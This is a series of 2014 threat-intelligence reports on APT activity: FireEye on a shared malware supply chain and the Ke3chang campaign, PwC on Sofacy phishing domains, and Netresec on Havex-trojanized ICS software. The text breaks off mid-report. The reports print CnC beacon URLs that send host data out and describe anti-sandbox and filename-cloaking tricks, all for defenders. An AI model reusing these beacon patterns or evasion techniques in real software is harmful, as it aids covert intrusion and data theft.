and 9002.<figure></figure>

 <caption>Figure 12: 9002 Builder code, with hard-coded
 offset to the server’s configuration block</caption>
</section>



<footer>28 www.fireeye.com</footer>
<header>Supply Chain Analysis: From Quartermaster to Sunshop</header>

<section>
<heading>Conclusion</heading>
Based on the evidence provided, we draw the 
following possible conclusions: 
 
[High Confidence] SDQ exists and supports 
separate APT campaigns.We believe the most 
likely explanation for these documented 
correlations is that a shared ‘development and 
logistics’ operation (SDQ) supports a number of 
different APT campaigns, as part of formal
offensive apparatus.[Low Confidence] SDQ and APT campaigns are 
a single actor.That said, it is conceivable that the 
11 clusters of activity, previously believed to be 
independent campaigns run by different actors, 
are in fact one cluster of activity run by one 
well-resourced actor.However, we believe this 
scenario is less likely because each cluster of 
activity utilized malware samples with different 
artifacts such as passwords, campaign identifiers, 
and mutexes.These artifacts were generally 
consistent within each cluster of activity but
differed across clusters.[Medium Confidence] SDQ does not exist, and
APT actors informally share among each other.Alternatively, different actors might be
responsible for the documented 11 clusters of
activity and instead of relying on a centralized
development and logistics operation, these
actors share TTPs through formal or informal
channels.In each of these scenarios, a shared development
and logistics infrastructure or some notion of a
digital quartermaster clearly underpins all of the
activity presented in this report.Whether this
quartermaster involves informal connections
between developers or a structured bureaucratic
organization serving a central offensive
apparatus is unclear.Regardless of the scenario,
the overall finding of a shared development and
logistics infrastructure suggests targeted
organizations are facing a more organized
menace than they realize.These highly 
sophisticated cyber attacks easily circumvent 
traditional signature-based defenses, such as 
next-generation firewalls, IPS, anti-virus, and 
gateways.The FireEye Threat Prevention 
Platform provides real-time, dynamic threat 
protection without the use of signatures to
protect an organization across the primary threat
vectors, including mobile, Web, email, and files and
across the different stages of an attack life cycle.The core of the FireEye platform is a virtual
execution engine, complemented by dynamic
threat intelligence, to identify and block cyber
attacks in real time.FireEye has over 1,100
customers across more than 40 countries,
including over 100 of the Fortune 500.</section>

<section>
FireEye, Inc. | 1440 McCarthy Blvd.Milpitas, CA 95035 | 408.321.6300 | 877.FIREEYE (347.3393) | info@fireeye.com | www.fireeye.com
</section>

<footer>
© 2014 FireEye, Inc. All rights reserved.FireEye is a registered trademark of FireEye,
Inc. All other brands, products, or service names are or may be trademarks or service
marks of their respective owners.RPT.MSC.EN-US.082014
</footer>
</doc><doc>
<cover>
   Cyber Threat Operations


Tactical Intelligence Bulletin                  Sofacy Phishing


   Date:        2014-10-22
   Contact:     threatintelligence@uk.pwc.com
   Reference:   CTO-TIB-20141022-01B
   TLP:         WHITE
   </cover>
   <section>
   
     <header> Tactical Intelligence Bulletin – TLP: WHITE</header>
      Background

      Our analysts follow the activities of a number of threat groups with a wide range of motivations.In this
      bulletin we are sharing intelligence relating to a recent phishing campaign conducted by a group widely
      referred to as ‘Sofacy’, named after the antivirus<fn>1</fn> detection name for one of the malware families used by
      the group.Over the years there have been a number of papers discussing variations to the malware used by the
      group, but little discussion of less sophisticated techniques employed by the same attackers.</section>
<section>
      Analysis

      Sofacy has been discussed before as being used to target APEC members <fn>2 </fn>and there has also been some
      prior analysis of the malware itself<fn>3</fn>.Variants of the malware have been in use for a considerable amount
      of time – for example, the screenshot below is from the decoy document loaded by one of the earliest
      versions present on ThreatExpert<fn>4</fn>, from February 2010.<figure></figure>

                                       Sample 5e3bea788e89e0814e898b4a648b93c0b74f7e2c


      Decoy documents are used in conjunction with malware droppers in order to make the target believe the
      file they have just opened is legitimate.The documents often give an indication of the attackers’ intended
      targets.More recently, ESET have reported5 on related spear phishes using NATO/Ukrainian conflict themes and
      watering hole attacks likely targeting the defence industry and a Polish finance company.It has been
      publicly speculated before that Sofacy malware is Russian in origin.Indicators found in the malware
      analysis referenced in the appendix, such as embedded resources and targeting would appear to support
      this theory.New domain registrations are usually
   indicative of a new campaign, and so we were eager to find new samples of the malware which connected
   to the infrastructure.The domain names chosen were almost identical to the legitimate domains of
   several organisations, a common technique and, like carefully chosen decoy documents, often gives clues
   as to the likely targets of the campaign.The usage of malware in targeted attacks to steal information of
   value to attackers has been widely reported, however the simple technique of phishing for credentials,
   whilst still relatively common in targeted attacks, is still more typically associated with criminal attackers
   involved in day to day cyber-fraud.The pages used for phishing typically used obfuscated code to redirect the user to another webpage:


<figure></figure>

   In some pages the malicious redirect was disabled by the attackers, by placing additional JavaScript on
   the page which would redirect users to a legitimate site preferentially.Fake login pages were observed both for webmail and two factor-authentication platforms.In the second
   case this would require the attackers to log in at the same time as affected victims, showing a level of
   dedication to the cause.As well as the domains used being similar to those of the targeted, the pages were
   also made to appear the same as their legitimate counterparts, making it difficult for end-users to tell they
   were being duped.For example the screenshot below shows the contents of a credential phishing website designed to mimic
   the legitimate OWA site of a defence contractor.The attacker’s version is on the left, the real version is on
   the right:




<footer>Cyber Threat Operations</footer>
  <header> Tactical Intelligence Bulletin – TLP: WHITE</header>


<figure></figure>

   Two of the domains we identified have previously been associated in open source with credential
   phishing, although not attributed to this group of attackers:

           In October 2013 the domain chmail[.]in was reported <fn>6</fn> as being used in widespread attacks
            against users of the Iranian mail service chmail[.]ir

           In January 2014 the domain google-settings[.]com was reported<fn>7</fn> as being used in credential theft
            against some gmail users.</section>
<section>
   Recommended Actions

   As ever with phishing attacks, one of the most important preventative steps you can take is to educate
   staff on how to identify suspicious emails – especially as there are fewer technical measures that can be
   taken to prevent low distribution phishing attacks which aim to steal credentials than there are for similar
   attacks involving malware.Organisations with good logging for their e-mail data could attempt to detect activity relating to
   compromised accounts by alerting on “impossible journeys”, where locations from which users log in are
   monitored and where alerts are produced when a single user logs in from two separate countries in a short
   period of time.</section>
<section>
   Snort Signatures

   We have developed some SNORT signatures to detect the current template used by the attackers in their
   phishing campaigns.<footer>Cyber Threat Operations</footer>
  <header> Tactical Intelligence Bulletin – TLP: WHITE</header>

</section>
<section>

   Appendix 1 - Domains
   Domains involved in this phishing campaign and associated domains used by the same threat actor:
<list>
   northropgrumman[.]org.uk
   counterterorexpo[.]com
   nato.nshq[.]in
   bostondynamlcs[.]com
   natoexhibitionff14[.]com
   vice-news[.]com
   world-oil-company[.]com
   hushmali[.]com
   mfanews[.]info
   azureon-line[.]com
   us-mg6mail-service[.]com
   mail.telecharger-01[.]com
   ns1.mfanews[.]org
   updatepc[.]org
   ya-support[.]com
   changepassword-hotmail[.]com
   mail.sofexjordanx[.]com
   kavkazcentr[.]info
   webmail.windows-updater[.]com
   abbott-export[.]com
   mfapress[.]com
   www.eurosatory-2014[.]com
   yavuz16[.]org
   mfauz[.]com
   mrthelp[.]org
   egreetingsfrom[.]us
   kitegacc[.]net
   kitegacc[.]com
   mail.rnil[.]am
   hothookup[.]net
   NETSCHECKER[.]com
   webmail-saic[.]com
   intuitstatistics[.]info
   flickr-service[.]com
   n0vinite[.]com
   assaas[.]org
   rnil[.]cl
   helpfromhome[.]co
   gdforum[.]net
   set121[.]com
   academl[.]com
   changepassword-yahoo[.]com
   greetingcardproject[.]com
   adawareblock[.]com
   securitypractic[.]com
   rnil[.]am
   YA-LOGIN[.]com
   mx1.g0b[.]mx
   product-update[.]com
   memoinfo[.]ru
   privacy-live[.]com
   tolonevvs[.]com
   us-westmail-undeliversystem[.]com
   test.chmail[.]in
   kakashka.chmail[.]in
   gov.hu[.]com




<footer>Cyber Threat Operations</footer>
  <header> Tactical Intelligence Bulletin – TLP: WHITE</header>



   us-mg6-transfermail-service[.]com
   us-mg6-mailreport[.]com
   aadexpo2014[.]co.za
   www.gdforum[.]info
   militaryinf[.]com
   valuetable[.]hk
   googlesetting[.]com
   hotmail-monitor[.]com
   junlper[.]net
   www.ya-support[.]com
   g-analytics[.]net
   www.sofexjordanx[.]com
   privacy-yahoo[.]com
   yahoo.chmail[.]in
   windous[.]kz
   youtubeclip[.]org
   aa.69[.]mu
   qov.hu[.]com
   vvorthyhands[.]org
   dkvnz[.]com
   mail.account-flickr[.]com
   bulletin-center[.]com
   yovtube[.]co
   skidkaturag[.]com
   defenceiq[.]us
   mail-google[.]info
   soft-storage[.]com
   clickchekkker[.]com
   intuitanalys[.]com
   sofexjordanx[.]com
   intuitstatistic[.]com
   militaryexponews[.]com
   caciltd[.]com
   windows-updater[.]com
   mail.securitypractic[.]com
   www.surll[.]me
   heidelberqcement[.]com
   armypress[.]org
   sweetcherry[.]org
   account-flickr[.]com
   setnewpass-yahoo[.]com
   scanmalware[.]info
   greetingcardsproject[.]com
   q0v[.]pl
   link-google[.]com
   www.forsvaret[.]co
   link-google[.]com
   cubic.com[.]co
   mail.mrthelp[.]org
   www.us-mg7mail-transferservice[.]com
   vVortHyHands[.]org
   www.vljaihln[.]com
   ifcdsc[.]org
   smigroup-online[.]co.uk
   100plusapps[.]com
   pruintco[.]com
   www.yahoo-monitor[.]com
   www.chmail[.]in
   litu.su
   www.dkvnz[.]com




<footer>Cyber Threat Operations</footer>
  <header> Tactical Intelligence Bulletin – TLP: WHITE</header>



   mail.yahoo-monitor[.]com
   us-mg7mail-transferservice[.]com
   evrosatory[.]com
   wind0ws[.]kz
   farnboroughair2014[.]com
   mfa-gov[.]info
   y-privacy[.]com
   login-osce[.]org
   helpmicrosoft[.]net
   sofexjordan2014[.]com
   malwarecheck[.]info
   update-hub[.]com
   mx3.set121[.]com
   srv-yahoo[.]com
   Us-westmail-undeliversystem[.]com
   bostondyn[.]com
   aerospacesystem[.]us[.]com
   eurosatary[.]com
   telecharger-01[.]com
   chmali[.]ir
   privacy.google-settings[.]com
   yandex-site[.]com
   www.7daysinabudhabi[.]org
   www.account-flickr[.]com
   google-settings[.]com
   ns1.greetingcardproject[.]com
   eurosator[.]com
   update-zimbra[.]com
   asisonlline[.]org
   mfapress[.]org
   ya-login[.]com
   stockliquidationgroup[.]com
   pasport-yandex[.]com
   konami-game[.]com
   www.adawareblock[.]com
   persa124[.]in
   eurosatory-2014[.]com
   clickchekker[.]com
   al-wayi[.]com
   molodirect[.]net
   com-0cd[.]net
   us-mg6mailyahoo[.]com
   finance-reports.everyday[.]com-w13[.]net
   apple-iclouds[.]com
   unizg[.]net
   mfanews[.]org
   mail.ya-support[.]com
   checkmalware[.]org
   geaviations[.]com
   flashsecurity[.]org
   imperialc0nsult[.]com
   cublc[.]com
   evronaval[.]com
   xuetue2013[.]com
   www.valuetable[.]hk
   mail.chmail[.]in
   nshq[.]in
   forsvaret[.]co
   in-eternal-memory-of[.]com
   www[.]us-westmail-undeliversystem[.]com




<footer>Cyber Threat Operations</footer>
  <header> Tactical Intelligence Bulletin – TLP: WHITE</header>


   gdforum[.]info
   sex-toy-shop[.]org
   novinitie[.]com
   yahoo-monitor[.]com
   standartnevvs[.]com
   pornforyou[.]in
   mail.q0v[.]pl
   mail.windows-updater[.]com
   allcashin[.]com
   changepassword-yahoo[.]com
   arnf[.]bg
   gpwpl[.]com
   updateapi.longmusic[.]com
   chmail[.]in
   brokersads[.]com
   testservice24[.]net
   kavkazjlhad[.]com
   livemicrosoft[.]net
   surll[.]me
   accesd-de-desjardins[.]com
   mail.hushmali[.]com
   sunmicrosystem[.]info
   bytly[.]org
   mx.rnil[.]cl
   poczta.mon.q0v[.]pl
   ns.mfanews[.]org
   7daysinabudhabi[.]org
   privacy-hotmail[.]com
   ns1.al-wayi[.]com
   ecards-yahoo[.]com
   eurosatory2014[.]com
   yahoo-analytics[.]com
   www.srv-yahoo[.]com
   set133[.]com


</list>


<footer>Cyber Threat Operations</footer>
  <header> Tactical Intelligence Bulletin – TLP: WHITE</header>



   References

   http://smallmedia.org.uk/sites/default/files/u8/IIIPSepOct.pdf
   https://twitter.com/MalCrawler/status/489128440323252226




   The information contained in this document has been prepared as a matter of interest and for
   information purposes only, and does not constitute professional advice.You should not act upon the
   information contained in this email without obtaining specific professional advice.No representation or
   warranty (express or implied) is given as to the accuracy or completeness of the information contained
   in this email, and, to the extent permitted by law, PricewaterhouseCoopers LLP, its members, employees
   and agents do not accept or assume any liability, responsibility or duty of care for any consequences of
   you or anyone else acting, or refraining to act, in reliance on the information contained in this email or
   for any decision based on it.Cyber Threat Operations

</section>
</doc><doc>
<header>Full Disclosure of Havex Trojans</header>
<section>
Monday, 27 October 2014 11:11:00 (UTC/GMT)

I did a presentation at the 4SICS conference earlier this week, where I disclosed the results from my
analysis of the Havex RAT/backdoor (slides available here).The Havex backdoor is developed and used by a hacker group called Dragonfly, who are also known as
"Energetic Bear" and "Crouching Yeti".Dragonfly is an APT hacker group, who have been reported to
specifically target organizations in the energy sector as well as companies in other ICS sectors such as
industrial/machinery, manufacturing and pharmaceutical.In my 4SICS talk I disclosed a previously unpublished comprehensive view of ICS software that has been
trojanized with the Havex backdoor, complete with screenshots, version numbers and checksums.Dale Petersen, founder of Digital Bond, expressed the following request regarding the lack of public
information about the software trojanized with Havex:

    If the names of the vendors that unwittingly spread Havex were made public, the wide coverage
    would likely reach most of the affected asset owners.Following Dale's request we decided to publish the information presented at 4SICS also in this blog post,
in order to reach as many affected asset owners as possible.The information published here is based on
our own sandbox executions of Havex malware samples, which we have obtained via CodeAndSec and
malwr.com.In addition to what I presented at 4SICS, this blog post also includes new findings published
by Joel "scadahacker" Langill in version 2.0 of his Dragonfly white paper, which was released just a couple
of hours after my talk.In Symantec's blog post about Havex they write:

    Three different ICS equipment providers were targeted and malware was inserted into the
    software bundles



</section>
<section>
<heading>Trojanized MESA Imaging driver</heading>

The first vendor known to have their software trojanized by the Dragonfly group was the Swiss company
MESA Imaging, who manufacture industrial grade cameras for range measurements.eWon published an incident report in January 2014 and then a follow-up report in July 2014 saying:

    Back in January 2014, the eWON commercial web site www.ewon.biz had been compromised.A
    corrupted eCatcherSetup.exe file had been uploaded into the CMS (Content Management
    System) of www.ewon.biz web site.eCatcher download hyperlinks were rerouted to this
    corrupted file.The corrupted eCatcherSetup.exe contained a malware which could, under
    restricted conditions, compromise the Talk2M login of the infected user.However, Joel's report also listed a product called “eGrabit”, which we
managed to obtain a malware sample for via malwr.com.MB Connect Line published a report about the Dragonfly intrusion in September 2014, where they write:

    On 16th of April 2014 our website www.mbconnectline.com has been attacked by hackers.The
    files mbCHECK (Europe), VCOM_LAN2 and mbCONFTOOL have been replaced with infected
    files.These files were available from 16th of April 2014 to 23th of April 2014 for download from
    our website.All of these files were infected with the known Trojan Virus Havex Rat.We have not been able to get hold of a malware sample for the trojanized version of VCOM_LAN2.The
screenshot below is therefore from a clean version of this software.Additionally, only the mbCHECK version for users in Europe was
infected with Havex, but not the one for US / Canada.These facts indicate that the Dragonfly / Energetic
Bear threat actor seems to primarily target ICS companies in Europe.</section>
<section>
<heading>Next: Detecting Havex with NSM</heading>

We're currently working on a follow-up blog post, which shows how to detect and analyze network traffic
from ICS networks infected with Havex.</section>
  <noncontent>Share |               Short URL: http://netresec.com/?b=14ABDA4

Posted by Erik Hjelmvik on Monday, 27 October 2014 11:11:00 (UTC/GMT)
</noncontent>
</doc>Large-scale cyber espionage campaigns such as “GhostNet” have demonstrated that
government agencies around the world, including embassies, are vulnerable to targeted cyber attacks.<fn>1</fn>
As the crisis in Syria escalates, FireEye researchers have discovered a cyber espionage campaign, which
we call “Ke3chang,” that falsely advertises information updates about the ongoing crisis to compromise
MFA networks in Europe.We believe that the Ke3chang attackers are operating out of China and
have been active since at least 2010.However, we believe specific Syria-themed attacks against
MFAs (codenamed by Ke3chang as “moviestar”) began only in August 2013.The timing of the attacks
precedes a G20 meeting held in Russia that focused on the crisis in Syria.<fn>2</fn>
FireEye gained visibility into one of 23 known command-and-control (CnC) servers operated by the
Ke3chang actor for about one week.During this time, we discovered 21 compromised machines
connecting to the CnC server.These included what appear to be three administrative tests by the
attackers and two connections from other malware researchers.Among the targets, we identified nine
compromises at government ministries in five different European countries.Eight of these compromises
were at MFAs.When FireEye had visibility on the CnC server, we saw the attackers engage in post-compromise
information gathering and lateral movement on the target network, where upon FireEye immediately
contacted the relevant authorities and began the notification process.</section>

<section>
<heading>The changing face of espionage</heading>
Alas, poor James Bond.The days are over when spies had to be both a black belt and Prince Charming
in the same scene.Today, the vast majority of intelligence collection is conducted through signals
intelligence.The ubiquity and vulnerability of the Internet have opened windows into the affairs of
Washington, Beijing, and Moscow to a degree that Bond author, Ian Fleming, would never have imagined.</section>

<section>
<heading>The advanced persistent threat</heading>
The worldwide deployment of espionage-focused malware has made this generation the Golden Age
of espionage.Global reach, stealthy maneuvers, legal cover, and plausible deniability—what more
could a spy ask for?That is why FireEye focuses on the vexing problem of the advanced persistent
threat (APT).APT activity is best described as a campaign, a series of attacks over time.Each attack comprises a
variety of phases, including reconnaissance, exploitation, command and control, lateral movement,
and exfiltration.<fn>3</fn> Intelligence can be extracted during each phase of the attack to build a full
understanding of the tools, techniques, and procedures (TTPs) used by a particular APT campaign’s life
cycle.However, network defenders may have only partial visibility into any single incident.That makes
tracking and correlating activity across multiple related incidents critical.</section>


<footnote>
     1	   Information Warfare Monitor.“Tracking GhostNet: Investigating a Cyber Espionage Network”.March 2009.The SecDev Group.“Shadows in the Cloud: An investigation into cyber espionage 2.0.” April 2010.SecureList.“’Red October’” Diplomatic Cyber Attacks Investigation”.January 2013.SecureList.“The NetTraveller”.June 2013.2	 G20 Leaders’ Summit, St. Petersburg on September 5-6, 2013
     3	 Cloppert, M. “Defining APT Campaigns”.June 2010.Cloppert, M. “Attacking the Cyber Kill Chain”.October 2009.Bejtlich, R. “Incident Phases of Compromise”.June 2009.</footnote>


<footer>FireEye, Inc.     Operation “Ke3chang”: Targeted Attacks Against Ministries of Foreign Affairs	                    2</footer>

<section>
<heading>The Ke3chang campaign</heading>
The Ke3chang attackers have been active since at least 2010.Tracking their activity over time has
revealed information on their targeting preferences and the malware tools they use.The attackers have
used three types of malware over the years and have traditionally targeted the aerospace, energy,
government, high-tech, consulting services, and chemicals/manufacturing/mining sectors.However, the
number of attacks against entities in these sectors has been small.The scarcity of individual attacks may
indicate the attackers are selective about their targets.During August 2013, FireEye gained visibility on one of 22 CnC servers used at that time by the Ke3chang
attackers.In addition to confirming compromised endpoints at several MFAs, FireEye gained unique
insight into the attackers’ lateral movement activities.In this report, we present the historical intelligence
we have gathered on the Ke3chang campaign, as well as an in-depth assessment of the ongoing
Syrian-themed attacks against these MFAs.Our objective is to arm network defenders with information
to combat this threat actor.</section>

<section>
<heading>Targeting</heading>
Traditionally, the Ke3chang attackers have used spear-phishing emails with either a malware
attachment or a link to a malicious download.They have also leveraged a Java zero-day vulnerability
(CVE-2012-4681), as well as older, reliable exploits for Microsoft Word (CVE-2010-3333) and Adobe PDF
Reader (CVE-2010-2883).The Ke3chang attackers have also sent Windows screensaver files (.scr) and
executable files (.exe) using the Unicode Right-To-Left-Override (RTLO) technique to cloak the original
filename extension from the targeted user.<fn>4</fn> In addition to the recent Syria-themed campaign, they also
used a London Olympics-themed campaign in 2012 and one that involved former model and French
first lady Carla Bruni in 2011.Percent of attacks by industry
                                                                                        targeted by Ke3chang actor</caption>
</section>


<footnote>
     4	 Ke3chang used the Java vulnerability (CVE-2012-4681) before a patch was available.Krebs, B.“’Right-to-Left Override’
     	 Aids Email Attacks”.September 2011.</footnote>


<footer>FireEye, Inc.    Operation “Ke3chang”: Targeted Attacks Against Ministries of Foreign Affairs	                                     3</footer>

<section>
<heading>Malware analysis and timeline</heading>
Over the years, the Ke3chang attackers have used three types of malware that we call: “BS2005”,
“BMW”, and “MyWeb”.We believe these three types of malware are an evolution of a single project
from a single developer or small team of developers sharing code.Functionally, it is a typical first stage
backdoor commonly found in APT attacks.It has the ability to upload and download files, run shell
commands, and sleep for a configurable length of time.All of the CnC communications are performed
over the HTTP protocol.The current Ke3chang campaign leverages the BS2005 malware, while older activity from 2010-2011
leveraged BMW, followed by the MyWeb malware sporadically used in between.</section>

<section>
<heading>BS2005: Oct 2011 – present (most recent)</heading>
<heading>BS2005 campaign: “moviestar”</heading>
Just as the media began to report on possible U.S. military intervention in Syria, the Ke3chang attackers
began to use this topic as a lure to trick their targets into running their malware.Although attackers
routinely employ breaking news as lures, the targets of this campaign, codenamed by Ke3chang as
“moviestar”, were various ministries of foreign affairs in Europe.The malware used in this most recent campaign is known as “BS2005”.One sample was located in a
ZIP file named “US_military_options_in_Syria.zip” (6cb633b371700d1bd6fde49ab38ca471) and contained
the file “US_military_options_in_Syria.pdf.exe” (b68a16cef982e6451ddf26568c60833d).This executable is
a “loader” that contains the process debugging (PDB) string:
<code>
  c:\BS2005\BS2005\release\Loader.pdb
</code>
Upon execution, the loader drops another executable “ie.exe” (277487587ae9c11d7f4bd5336275a906)
that contains the following PDB string:
<code>
  c:\BS2005\BS2005\release\IE.pdb
</code>
This executable has a compile date of 2013/07/25 and BS2005 is the most recent iteration of
the backdoor.In this case, the mark
in the Syria-themed iteration of this campaign was consistently the “moviestar” tag.An “nn” refers to NOP/NOOP (“NO OPeration”—a beacon signal).<figure></figure>


                                                                            <caption>Figure 2.The Base64 data for the POST body decodes and decrypts to one
of the following: “no,” uploaded file content, or the output from the previous command.<footer>FireEye, Inc.   Operation “Ke3chang”: Targeted Attacks Against Ministries of Foreign Affairs	         6</footer>
Once the HTTP POST completes, the response is an HTML page with a hidden form (see Figure 3).A particular string sequence is expected, which contains a command ID and delimited parameters.All three malware families that FireEye analyzed (BS2005, MyWeb, and BMW) follow a similar CnC
pattern in their HTTP replies.<figure></figure>


                                                                               <caption>Figure 3.Rendered Web page retrieved
                                                                               by BS2005 as HTTP REPLY to HTTP POST</caption>

<figure></figure>


                                                                               <caption>Figure 4.HTML retrieved by BS2005.The highlighted portion contains the
                                                                               post-compromise command data
                                                                               returned back to the malware</caption>




<footer>FireEye, Inc.   Operation “Ke3chang”: Targeted Attacks Against Ministries of Foreign Affairs	                          7</footer>

At least one of the BS2005 samples contained a simple anti-virtual machine heuristic.Specifically,
the GetTickCount function is called and a loop is executed 999,999,990 times that simply increments
a variable.After this loop completes, GetTickCount is called again and the values are compared.If they are the same, the process terminates.A trait common to all three malware families we analyzed is that they use the IWebBrowser2 COM
interface to perform their CnC communication.This programming interface allows the programmer
to reuse code from an existing browser (typically Internet Explorer) to perform Web browsing,
simplifying the development process.The network communication is actually performed through the
browser process, causing some misdirection when it comes to determining which process is ultimately
responsible for generating this network traffic.This technique is nothing new for malware, but FireEye
did notice something interesting in BS2005’s behavior.BS2005 attempts to kill any processes named “maxthon.exe” or “360se.exe.” The “360se.exe” process
seems to make sense, because it relates to 360 Chinese anti-virus software.But why the malware would
be programmed to terminate Maxthon, a free browser developed by a Chinese company, was
initially unclear.Upon further investigation, we found that if a Maxthon browser is open while the BS2005 malware uses
this IWebBrowser2 COM interface to navigate to a Web page, the Maxthon browser opens a new tab
and visibly navigates to the Web page itself.Instead of using other APIs to make Web requests and read
responses, the BS2005 developer apparently dealt with this issue by simply killing any Maxthon browser
processes running on the target computer.This lack of sophistication is present throughout the code in
all three malware families (BS2005, MyWeb, and BMW).BS2005 is actually the most complex of the three,
which makes sense given that it is the most recent malware family we have seen.Improvements in the BS2005 version of the malware include a “sleep until date/time” command and
weak encryption for all CnC data; previous iterations (MyWeb and BMW) did not encrypt the host
information sent in the beacon.<heading>BS2005 campaign: “snake”</heading>
In 2011 a campaign, labeled “snake” by the attackers, started using the theme of nude photos
of the French prime minister’s wife, Carla Bruni, as a lure.Attackers sent an email to various targets
that encouraged recipients to download a password-protected RAR file (see Figure 5).The malware contained within the RAR was named “carla_bruni_nude_pics_spp.scr”
(727ef86947f5e109435298e077296a42 ).When executed, the BS2005 malware connected
to a CnC server with the following HTTP traffic pattern:

<figure></figure>


                                                                               <caption>Figure 5.<heading>BS2005 campaigns: “dream/dolphin”</heading>
In 2012, another series of attacks began that leveraged information about the London Olympics in an
attempt to lure targets into clicking on malicious attachments (see Figure 6 and Figure 7).Based on
information from the FireEye® Dynamic Threat Intelligence™ (DTI) cloud, we observed that this campaign
targeted a single firm in the Chemicals/Manufacturing/Mining sector.These attacks leveraged older exploits in Adobe PDF Reader (CVE-2010-2883) and Microsoft
Word (CVE-2010-3333).These BS2005-laced samples (ecc1167a5f45d72c899303f9bbe44bbc and
b391d47b37841741a1817221b946854a) connected to the following CnC servers:
•	news.studenttrail.com
•	 skyline.ns1.name

<figure></figure>


                                                          <caption>Figure 6.BS2005 “dream/dolphin” campaign 2012
                                                          Olympic-themed decoy content—daily competition schedule</caption>


<footer>FireEye, Inc.   Operation “Ke3chang”: Targeted Attacks Against Ministries of Foreign Affairs	                       9</footer>

<figure></figure>
                                                                               <caption>Figure 7.BS2005 “dream/dolphin”
                                                                               campaign 2012 Olympic-themed decoy
                                                                               content— early check-in communication</caption>




The HTTP callback pattern to the CnCs in these cases was modified slightly from the earlier path
of “/ke3chang/” to “/shfam9y/”.<code>
  POST /shfam9y/Default.aspx?r=<Base64 Encoded Data>a= HTTP/1.1
</code>
This could represent an attempt to avoid any network-based signatures that detect based on the
specific URL path of earlier samples.Lastly, the addition constant for the CnC encryption routine in
these two BS2005 samples is 0x7C.<heading>BS2005 campaign: “newtiger”</heading>
Three months after the Olympics-themed attacks, FireEye observed a new BS2005 campaign
labeled “newtiger,” which is possibly a reference to an older 2010 campaign labeled “tiger.” The
decoy content in this case is a threat report from a well-known security vendor (see Figure 8).Using
information from the FireEye DTI cloud, FireEye observed that this campaign targeted a single firm
in the Services/Consulting sector.<footer>FireEye, Inc.   Operation “Ke3chang”: Targeted Attacks Against Ministries of Foreign Affairs	                          10</footer>

<figure></figure>
                                                                               <caption>Figure 8.BS2005 “newtiger” campaign
                                                                               security-themed decoy content</caption>




The sample used in this attack (50dd931b85891168244a10073f4a6f79) dropped BS2005 malware
that connected to the CnC www.trap.dsmtp.com and used the “/shfam9y/” URI path.</section>

<section>
<heading>MyWeb: Jan 2010 – May 2011</heading>
The Ke3chang attackers used the older “MyWeb” malware family from 2010 to 2011.The MyWeb
sample that FireEye analyzed has a compile date of 1/20/2011.At least one of the attacks in this
campaign leveraged a European security and defense-themed lure, which aligns with the targeting
preferences for this group.MyWeb is the second-generation malware used by this threat actor; it was used after BMW but before
BS2005.Improvements over BMW include an anti-sandbox detection technique, a configurable sleep
value for the CnC beacon loop, and a consolidated configuration block that enables the malware
author to change the CnC domain without having to recompile the malware.MyWeb’s anti-sandbox detection technique calls GetSystemTime, saving the value, then looping
500,000 times calling GetSystemTime for each loop; finally, the malware compares the milliseconds
value of the last call with the value saved from the first call.If the values are equal, the malware process
terminates silently.The MyWeb configuration is stored in a 104-byte block of encoded data appended to the end of the
portable executable (PE) file.To decode the configuration data, each character has its positional index
number added to it.The CnC domain is stored at offset 0x0.Upon successful connection to the CnC
server, the malware sleeps for the amount of time that is stored in seconds at offset 0x20.The sleep
value used for CnC connection failures is stored in minutes at offset 0x30.<footer>FireEye, Inc.   Operation “Ke3chang”: Targeted Attacks Against Ministries of Foreign Affairs	                         11</footer>

<figure></figure>
                                                                            <caption>Figure 9.MyWeb configuration
                                                                            block decode routine</caption>

<figure></figure>


                                                                            <caption>Figure 10.Decoded MyWeb
                                                                            configuration block</caption>




MyWeb only encrypts the command results data sent back to the CnC server using the same weak
encryption algorithm as BS2005 (see Figure 2).The addition constant for the encryption routine for the
sample we analyzed (be58180f4f7ee6a643ab1469a40ffbca) is 0x5A.The beacon data is transmitted
in URL parameters in plaintext and is self-explanatory:
<code>
  hxxp://ensun.dyndns.org/MYWEB/SearchX.ASpX?id1=<local IP
  address>&id2=<computer name>&id3=<volume serial number>&id4=<32 random
  alphabet characters>
</code>
Downloaded and uploaded files are simply Base64 encoded.Command results are encrypted and
then Base64 encoded.</section>

<section>
<heading>BMW: July 2010</heading>
BMW is the earliest iteration of this malware that FireEye has seen and was used by the Ke3chang
attackers in older 2010 attacks.The initial infection vector is unknown; however, BMW was presumed
to be delivered via weaponized email attachments/links—similar to the newer campaigns leveraging
MyWeb and BS2005.The samples we analyzed have a compile date of 2010/07/08.The <X Bytes> data
indicates the number of bytes last downloaded from the download file command.BMW encrypts uploaded and downloaded files and command results before Base64 encoding them,
using the same weak encryption algorithm as BS2005 (see Figure 2).The constant used for addition in
the sample we analyzed is 0x5A.<footer>FireEye, Inc.   Operation “Ke3chang”: Targeted Attacks Against Ministries of Foreign Affairs	          13</footer>
Malware Family Matrix
Table 1 is a complete list of all samples that were analyzed as part of this investigation, along with
any known URI variances, campaign markers, and decoy or lure themes used by this threat actor.The attackers shift IP addresses frequently and often point their CnC domains to
legitimate IP addresses when they are not in use.<figure></figure>


                                                                               <caption>Figure 11.Common Ke3chang CnC
                                                                               infrastructure</caption>



Using the IP addresses from the 23 CnC servers FireEye collected from our initial samples, we then
mapped all the IP addresses that these domains resolved to.We then collected any other domains
that also resolved to these IP addresses, resulting in at least 99 possible Ke3chang CnC servers.<figure></figure>


                                                                             <caption>Figure 12.Expanded Ke3chang
                                                                             CnC infrastructure</caption>


<footer>FireEye, Inc.   Operation “Ke3chang”: Targeted Attacks Against Ministries of Foreign Affairs	                   16</footer>
Upon further analysis, we find that these 99 CnC servers are primarily located in the U.S., China,
and Hong Kong.<figure></figure>


                                                                               <caption>Figure 13.Geolocation of Ke3chang
                                                                               CnC infrastructure</caption>
</section>


<section>
<heading>Ke3chang CnC control panel</heading>
Upon accessing one of the Ke3chang CnC servers, we found that the attackers have a Web-based
control panel that allows them to interact with compromised computers, as shown in Figure 14.<figure></figure>


                                                                               <caption>Figure 14.Ke3chang CnC control panel</caption>




The control panel also contains a link to an “AutoScanner” feature that includes several preconfigured
commands to gather information about a compromised system and perform network reconnaissance
on the endpoint (see Figure 15).<footer>FireEye, Inc.   Operation “Ke3chang”: Targeted Attacks Against Ministries of Foreign Affairs	                          17</footer>

<figure></figure>
                                                                               <caption>Figure 15.Ke3chang
                                                                               AutoScanner commands</caption>

<figure></figure>


                                                                               <caption>Figure 16.Ke3chang AutoScanner
                                                                               command panel output</caption>
</section>

<section>
<heading>Information gathering / lateral movement analysis</heading>
